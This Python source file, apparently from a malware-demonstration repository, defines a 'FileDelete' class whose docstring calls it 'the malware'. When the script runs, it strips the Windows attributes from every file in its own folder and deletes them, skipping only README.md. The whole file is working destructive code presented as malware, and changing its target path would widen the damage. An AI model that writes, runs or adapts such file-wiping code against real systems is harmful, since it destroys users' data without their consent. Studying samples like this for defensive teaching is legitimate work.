import logging
import os
import sys
import stat
import win32api
import win32con
from cached_property import cached_property


class FileDelete:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name


    def delete_file(self, path):
        num_delete_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository.
            if file == 'README.md':
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        for file in files:
            logging.debug('Delete file: {}'.format(file))
            win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_NORMAL)
            os.remove(file)
            num_delete_files += 1

        return num_delete_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create file delete.
    file_delete = FileDelete('FileDelete')

    # Delete all files in the same folder.
    path = os.path.dirname(os.path.abspath(__file__))
    number_infected_files = file_delete.delete_file(path)

    logging.info('Number of delete files: {}'.format(number_infected_files))